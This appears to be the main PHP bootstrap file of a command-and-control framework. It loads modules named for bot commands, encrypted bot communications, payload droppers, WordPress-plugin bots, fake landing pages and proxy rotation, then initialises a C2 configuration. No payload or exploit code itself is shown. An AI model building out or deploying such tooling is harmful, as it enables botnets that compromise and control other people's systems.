<?php

// auto load
include "lib/vendor/autoload.php";
// custom php classes
include "lib/curlStuff/validateMeMore/talkToMeDamnit.php";
include "lib/bots/bot_cmds/doMyBidding.php";
include "lib/bots/bot_coms/listenToMe.php";
include "lib/bots/bot_esplode/mustRetreat.php";
include "lib/bots/bot_files/hereEatThis.php";
include "lib/crypto/encryptMyComs/hideMyCommunication.php";
include "lib/crypto/needSalt/missingSalt.php";
include "lib/proxyWorks/confirmProxy.php";
include "lib/config/defaultConfig.php";
include "lib/fake_the_landing/randomDefaultPage.php";
include "lib/logos/art/artisticStuff.php";
include "lib/logos/menus/mainMenu.php";
include "lib/new_bots/makeMeSlim/slimDropper.php";
include "lib/proxies/populateRandomProxies.php";
include "lib/userAgents/agentsList.php";
include "lib/initialization/slop_pg/slop_pg.php";
include "lib/database/slopPgSql.php";
include "lib/initialization/slop_sqlite/slop_sqlite.php";
include "lib/database/slopSqlite.php";
include "lib/initialization/initializeC2/initializeC2ConfigFile.php";
include "lib/new_bots/wordpressPlugins/makeMeWordPressing.php";
include "lib/curlStuff/mainCurl.php";
include "lib/crypto/certMaker/certGenerator.php";

use config\defaultConfig;

mt_srand((int) (microtime(true) * 1000000));

const default_config = new defaultConfig();

if (!defined("CLEAR")){
    if (DIRECTORY_SEPARATOR == '\\'){
        define("CLEAR", "cls");
    } else {
        define("CLEAR", "clear");
    }
}

if (!defined("CUSTOM_PATH_SEPARATOR")){
    if (DIRECTORY_SEPARATOR == '\\'){
        define("CUSTOM_PATH_SEPARATOR", ";");
    } else {
        define("CUSTOM_PATH_SEPARATOR", ":");
    }
}
set_include_path(get_include_path() . constant("CUSTOM_PATH_SEPARATOR") . getcwd() . "/lib");

if (!defined("SQL_USE")){
    $a = new initialization\initializeC2\initializeC2ConfigFile(default_config->exportConfigConstants()['slop_home'], true);
}
